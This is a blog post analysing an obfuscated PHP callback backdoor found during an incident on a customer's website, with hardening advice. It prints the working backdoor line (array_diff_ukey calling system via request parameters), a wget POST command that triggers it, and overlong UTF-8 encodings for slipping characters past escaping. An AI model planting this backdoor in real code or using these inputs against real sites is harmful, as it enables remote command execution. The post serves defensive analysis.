+++
title ="PHP callback function backdoor"
date ="2014-05-10"
categories = ["Security"]
tags = ["Backdoor", "PHP"]
slug = "php-callback-function-backdoor"
project_url = "https://greyhat.dk/php-callback-function-backdoor"
type = "post"
description = "Understanding a found PHP backdoor"
+++

I recently had an incident at a customers website where the site was
compromised. The customer went through the code and found several SQL
injections, XSS and newly added files with backdoors (basic evals in
PHP). All vulnerabilities was fixed (According to the customer) but
about a month later the site was compromised again. Unfortunately no
version control was used so we had to go through all files to help the
customer and the log had no indications of successful attempts.

In several files I found code like this

```php
    @array_diff_ukey(@array((string)$_REQUEST['list']=>1), @array((string)stripslashes($_REQUEST['list2'])=>2),$_REQUEST['var']);
```

It took me a while to fully understand what this is. This is a quite
clever backdoor and the reason why its was not detected in apaches log
is that POST was used to execute the command for compromising.

So in order to execute a command on the system all the attacker had to
  do was

```sh
    $ wget -S -O - --post-data 'var=system&list=ls' http://example.com/g.php --2014-05-10 14:23:45-- http://example.com/g.php Resolving example.com... 127.0.0.1 Connecting to example.com|127.0.0.1|:80... connected. HTTP request sent, awaiting response... HTTP/1.1 200 OK Date: Sat, 10 May 2014 12:23:45 GMT Server: Apache Connection: close Content-Type: text/html Length: unspecified [text/html] Saving to: 'STDOUT' 
    [<=> ] 0 --.-K/s
    cv.pdf
    g.php
    index.html
    index5.html
    [ <=> ] 79 --.-K/s in 0s
    2014-05-10 14:23:45 (428 KB/s) - written to stdout [79]
```


Nice directory listing :) I'm pretty sure you can find alternative ways
to use this then listing files. But since the customer did not find this
backdoor using a review it really proves a few things.

-  Always use version control on your software (Subversion, Git etc)
-  Always sanitize input
-  Hire developers who knows the current languages pitfalls, know how to
   review code.

Another thing I found was a heavy usage of the php function
mysql\_real\_escape\_string. The function does not provide any real
security since it does not handle overlong UTF-8 chars.

```sh
    ' = %27 = %c0%a7 = %e0%80%a7 = %f0%80%80%a7 
    " = %22 = %c0%a2 = %e0%80%a2 = %f0%80%80%a2 
    < = %3c = %c0%bc = %e0%80%bc = %f0%80%80%bc
    ; = %3b = %c0%bb = %e0%80%bb = %f0%80%80%bb 
    & = %26 = %c0%a6 = %e0%80%a6 = %f0%80%80%a6 
    \0= % 00 = %c0%80 = %e0%80%80 = %f0%80%80%80
```
 
